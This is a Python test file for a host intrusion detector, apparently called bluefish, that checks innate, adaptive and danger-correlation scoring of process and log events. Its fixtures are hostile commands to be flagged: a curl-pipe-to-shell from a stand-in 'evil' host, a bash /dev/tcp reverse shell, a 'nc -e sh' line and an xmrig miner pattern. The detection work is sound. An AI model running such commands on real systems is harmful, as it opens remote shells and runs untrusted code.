"""Tests for the innate, adaptive, and danger detectors."""

from bluefish.core.detectors.adaptive import AdaptiveDetector
from bluefish.core.detectors.danger import DangerCorrelator
from bluefish.core.detectors.innate import InnateDetector
from bluefish.core.events import make_log_event, make_process_event
from bluefish.core.self_profile import SelfProfile


def _proc(name="x", exe="/tmp/x", user="root", cmd="/tmp/x", pid=1):
    return make_process_event(
        name=name, exe=exe, username=user, cmdline=cmd, pid=pid
    )


# --- innate -------------------------------------------------------------
def test_innate_flags_tmp_execution():
    result = InnateDetector().inspect(_proc())
    assert result.score >= 0.8
    assert any("temp" in r for r in result.reasons)


def test_innate_flags_pipe_to_shell():
    ev = make_process_event(
        name="sh", exe="/bin/sh", username="user",
        cmdline="curl http://evil/x.sh | sh", pid=2,
    )
    result = InnateDetector().inspect(ev)
    assert result.score >= 0.9


def test_innate_flags_reverse_shell():
    ev = make_process_event(
        name="bash", exe="/bin/bash", username="user",
        cmdline="bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", pid=3,
    )
    result = InnateDetector().inspect(ev)
    assert result.score >= 0.9


def test_innate_custom_rule():
    det = InnateDetector(
        extra_rules=[{"name": "miner", "pattern": "xmrig", "score": 0.7}]
    )
    ev = make_process_event(
        name="xmrig", exe="/usr/bin/xmrig", username="user",
        cmdline="xmrig --coin monero", pid=4,
    )
    result = det.inspect(ev)
    assert result.score >= 0.7
    assert any("miner" in r for r in result.reasons)


def test_innate_ignores_benign():
    ev = make_process_event(
        name="nginx", exe="/usr/sbin/nginx", username="www-data",
        cmdline="nginx: worker", pid=5,
    )
    assert InnateDetector().inspect(ev).score == 0.0


# --- adaptive -----------------------------------------------------------
def test_adaptive_silent_when_untrained(store):
    profile = SelfProfile(store)
    det = AdaptiveDetector(profile)
    assert det.inspect(_proc()).score == 0.0


def test_adaptive_flags_non_self(store):
    profile = SelfProfile(store)
    profile.learn(make_process_event(
        name="bash", exe="/bin/bash", username="alice", cmdline="bash", pid=1
    ))
    det = AdaptiveDetector(profile, novelty_threshold=0.5)
    novel = make_process_event(
        name="nc", exe="/bin/nc", username="alice", cmdline="nc -e sh", pid=2
    )
    assert det.is_non_self(novel) is True


def test_adaptive_tolerates_self(store):
    profile = SelfProfile(store)
    ev = make_process_event(
        name="bash", exe="/bin/bash", username="alice", cmdline="bash", pid=1
    )
    for _ in range(10):
        profile.learn(ev)
    det = AdaptiveDetector(profile, novelty_threshold=0.5)
    assert det.is_non_self(ev) is False


# --- danger -------------------------------------------------------------
def test_danger_accumulates_inflammation():
    danger = DangerCorrelator(window_seconds=60)
    base = 1000.0
    # Novel root process from tmp is highly dangerous.
    ev = make_process_event(
        name="x", exe="/tmp/x", username="root", cmdline="/tmp/x", pid=1, ts=base
    )
    r = danger.inspect(ev, signature_known=False)
    assert r.danger > 0
    assert danger.inflammation(now=base) >= r.danger


def test_danger_window_decays():
    danger = DangerCorrelator(window_seconds=10)
    ev = make_log_event(
        line="sshd: authentication failure", path="/var/log/auth.log", ts=1000.0
    )
    danger.inspect(ev)
    assert danger.inflammation(now=1000.0) > 0
    # Far outside the window -> decayed to zero.
    assert danger.inflammation(now=2000.0) == 0
